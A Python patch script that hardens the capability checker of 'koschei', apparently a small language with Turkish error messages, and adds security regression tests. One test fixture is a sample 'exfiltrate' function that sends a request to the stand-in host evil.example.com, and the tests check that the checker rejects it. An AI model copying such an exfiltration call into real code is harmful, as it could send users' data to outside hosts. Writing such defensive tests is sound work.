from __future__ import annotations

from pathlib import Path
from textwrap import dedent, indent


def read(path: str) -> str:
    return Path(path).read_text(encoding="utf-8")


def write(path: str, text: str) -> None:
    Path(path).write_text(text, encoding="utf-8")


def replace_exact(path: str, old: str, new: str) -> None:
    text = read(path)
    count = text.count(old)
    if count != 1:
        raise SystemExit(f"{path}: exact replace beklenen=1 bulunan={count}")
    write(path, text.replace(old, new))


def replace_region(path: str, start: str, end: str, new: str) -> None:
    text = read(path)
    start_count = text.count(start)
    end_count = text.count(end)
    if start_count != 1 or end_count < 1:
        raise SystemExit(
            f"{path}: region marker start={start_count} end={end_count}"
        )
    begin = text.index(start)
    finish = text.index(end, begin)
    write(path, text[:begin] + new + text[finish:])


call_block = indent(
    dedent(
        """\
        if isinstance(expression, CallExpression):
            argument_types = [
                self._check_expression(argument)
                for argument in expression.arguments
            ]

            if isinstance(expression.callee, MemberExpression):
                receiver_type = self._check_expression(expression.callee.object)
                return self._check_method_call(
                    receiver_type,
                    expression.callee.member,
                    expression.location,
                    argument_types,
                )

            if isinstance(expression.callee, Identifier):
                function = self.functions.get(expression.callee.name)
                if function is not None:
                    self._check_call_arguments(
                        function,
                        argument_types,
                        expression.location,
                    )
                    return (
                        str(function.return_type)
                        if function.return_type
                        else "Void"
                    )

            return self._check_expression(expression.callee)

        """
    ),
    "        ",
)
replace_region(
    "koschei/semantic.py",
    "        if isinstance(expression, CallExpression):\n",
    "        if isinstance(expression, BinaryExpression):\n",
    call_block,
)

helper_and_signature = indent(
    dedent(
        """\
        def _check_call_arguments(
            self,
            function: FunctionDeclaration,
            argument_types: list[str | None],
            location: SourceLocation,
        ) -> None:
            parameters = function.parameters
            if len(argument_types) != len(parameters):
                missing = parameters[len(argument_types):]
                missing_capabilities = [
                    parameter
                    for parameter in missing
                    if any(
                        type_name in CAPABILITY_TYPES
                        for type_name in parameter.type_ref.names
                    )
                ]
                if missing_capabilities:
                    required = ", ".join(
                        f"{parameter.name}: {parameter.type_ref}"
                        for parameter in missing_capabilities
                    )
                    raise SemanticError(
                        "KS2401",
                        f"'{function.name}' çağrısı gerekli capability jetonunu "
                        f"almadı: {required}.",
                        location,
                    )
                raise SemanticError(
                    "KS1301",
                    f"'{function.name}' çağrısı {len(parameters)} argüman bekler, "
                    f"{len(argument_types)} verildi.",
                    location,
                )

            for index, (parameter, actual_type) in enumerate(
                zip(parameters, argument_types),
                start=1,
            ):
                expected_capabilities = {
                    type_name
                    for type_name in parameter.type_ref.names
                    if type_name in CAPABILITY_TYPES
                }
                if not expected_capabilities:
                    continue
                if actual_type not in expected_capabilities:
                    expected = " veya ".join(sorted(expected_capabilities))
                    found = actual_type or "kanıtlanamayan bir değer"
                    raise SemanticError(
                        "KS2401",
                        f"'{function.name}' çağrısının {index}. argümanı "
                        f"{expected} capability jetonu olmalıdır; {found} bulundu.",
                        location,
                    )

        def _check_method_call(
            self,
            receiver_type: str | None,
            method_name: str,
            location: SourceLocation,
            argument_types: list[str | None] | None = None,
        ) -> str | None:
        """
    ),
    "    ",
)
replace_region(
    "koschei/semantic.py",
    "    def _check_method_call(\n",
    "        # List metotları yetki denetiminden ÖNCE ele alınır:",
    helper_and_signature,
)

replace_exact(
    "koschei/semantic.py",
    '            return str(function.return_type) if function.return_type else "Void"\n\n        if receiver_type == "List":',
    '            self._check_call_arguments(function, argument_types or [], location)\n'
    '            return str(function.return_type) if function.return_type else "Void"\n\n'
    '        if receiver_type == "List":',
)

manifest_class = dedent(
    '''\
    @dataclass(slots=True)
    class Manifest:
        grants: list[Grant] = field(default_factory=list)
        operations: dict[str, set[str]] = field(default_factory=dict)
        holder_functions: dict[str, list[str]] = field(default_factory=dict)
        required_domains: set[str] = field(default_factory=set)
        main_has_capabilities: bool = False

        @property
        def has_any(self) -> bool:
            return (
                bool(self.grants)
                or bool(self.holder_functions)
                or bool(self.required_domains)
                or self.main_has_capabilities
            )

        @property
        def is_exact(self) -> bool:
            """Dinamik veya çağırana bırakılmış kapsam yoksa manifesto kesindir."""
            granted_domains = {grant.domain for grant in self.grants}
            unresolved_requirements = self.required_domains - granted_domains
            return (
                not any(grant.is_dynamic for grant in self.grants)
                and not unresolved_requirements
            )

        def domains(self) -> list[str]:
            seen = {grant.domain for grant in self.grants} | self.required_domains
            return [domain for domain in DOMAIN_ORDER if domain in seen]

        def grants_for(self, domain: str) -> list[Grant]:
            return [grant for grant in self.grants if grant.domain == domain]
    ''')
replace_region(
    "koschei/capabilities.py",
    "@dataclass(slots=True)\nclass Manifest:\n",
    "\n\nTYPE_DOMAINS = {\n",
    manifest_class,
)

holder_block = indent(
    dedent(
        """\
        if capability_parameters:
            manifest.holder_functions[declaration.name] = [
                f"{parameter.name}: {parameter.type_ref}"
                for parameter in declaration.parameters
                if any(name in NARROWED_METHODS for name in parameter.type_ref.names)
            ]
            for parameter in declaration.parameters:
                for type_name in parameter.type_ref.names:
                    domain = TYPE_DOMAINS.get(type_name)
                    if domain is not None:
                        manifest.required_domains.add(domain)

        """
    ),
    "        ",
)
replace_region(
    "koschei/capabilities.py",
    "        if capability_parameters:\n",
    "        if declaration.name == \"main\" and declaration.parameters:\n",
    holder_block,
)

render_block = indent(
    dedent(
        """\
        if not grants:
            if domain in manifest.required_domains:
                lines.append(f"{title}:")
                lines.append(
                    f"  - {DYNAMIC}  "
                    "(capability çağıran tarafından sağlanmalıdır)"
                )
            else:
                lines.append(f"{title}: yok")
            continue

        lines.append(f"{title}:")
        """
    ),
    "        ",
)
replace_region(
    "koschei/capabilities.py",
    "        if not grants:\n",
    "        for grant in grants:\n",
    render_block,
)

replace_exact(
    "koschei/capabilities.py",
    '        "capability_functions": manifest.holder_functions,\n    }',
    '        "capability_functions": manifest.holder_functions,\n'
    '        "required_domains": sorted(manifest.required_domains),\n'
    '    }',
)

replace_exact(
    "koschei/capabilities.py",
    "            merged.holder_functions[label] = parameters\n"
    "        merged.main_has_capabilities = (",
    "            merged.holder_functions[label] = parameters\n"
    "        merged.required_domains.update(part.required_domains)\n"
    "        merged.main_has_capabilities = (",
)

replace_exact(
    "koschei/cli.py",
    "    violations = sorted(\n"
    "        {grant.domain for grant in manifest.grants if grant.domain in set(denied)}\n"
    "    )\n",
    "    violations = sorted(set(manifest.domains()) & set(denied))\n",
)

Path("tests/test_security_regressions.py").write_text(
    dedent(
        '''\
        from __future__ import annotations

        import io
        import pathlib
        import tempfile
        import unittest
        from contextlib import redirect_stderr, redirect_stdout

        from koschei.capabilities import analyze, render, to_dict
        from koschei.cli import main
        from koschei.parser import parse
        from koschei.semantic import ImportedModule, SemanticError, check


        EXFILTRATE = """
        fn exfiltrate(net: NetCaps) {
            let response = net.get("https://evil.example.com") or ""
        }
        """


        class CapabilityContractRegressionTests(unittest.TestCase):
            def test_local_call_without_net_token_is_rejected(self) -> None:
                program = parse(EXFILTRATE + "fn main() { exfiltrate() }")
                with self.assertRaisesRegex(SemanticError, "KS2401"):
                    check(program)

            def test_string_cannot_impersonate_net_token(self) -> None:
                program = parse(
                    EXFILTRATE
                    + 'fn main() { exfiltrate("https://evil.example.com") }'
                )
                with self.assertRaisesRegex(SemanticError, "KS2401"):
                    check(program)

            def test_imported_call_without_net_token_is_rejected(self) -> None:
                dependency = parse(EXFILTRATE)
                declaration = dependency.declarations[0]
                imported = ImportedModule(
                    "attack",
                    {declaration.name: declaration},
                    {},
                )
                root = parse("import attack fn main() { attack.exfiltrate() }")
                with self.assertRaisesRegex(SemanticError, "KS2401"):
                    check(root, {"attack": imported})

            def test_capability_function_is_never_reported_as_pure(self) -> None:
                program = parse(EXFILTRATE + 'fn main() { println("safe") }')
                check(program)
                manifest = analyze(program)
                text = render(manifest, "attack.ks")
                payload = to_dict(manifest, "attack.ks")

                self.assertTrue(manifest.has_any)
                self.assertFalse(manifest.is_exact)
                self.assertIn("net", manifest.domains())
                self.assertIn("net", payload["required_domains"])
                self.assertNotIn("saf hesaplama", text)
                self.assertIn("capability çağıran tarafından sağlanmalıdır", text)
                self.assertIn("exfiltrate", text)

            def test_deny_net_blocks_unresolved_capability_requirement(self) -> None:
                source = EXFILTRATE + 'fn main() { println("safe") }'
                with tempfile.TemporaryDirectory() as directory:
                    path = pathlib.Path(directory) / "attack.ks"
                    path.write_text(source, encoding="utf-8")
                    output = io.StringIO()
                    error = io.StringIO()
                    with redirect_stdout(output), redirect_stderr(error):
                        exit_code = main(["caps", str(path), "--deny", "net"])

                self.assertEqual(exit_code, 2)
                self.assertIn("reddedilen yetki alanı", error.getvalue())
                self.assertNotIn("saf hesaplama", output.getvalue())


        if __name__ == "__main__":
            unittest.main()
        '''
    ),
    encoding="utf-8",
)
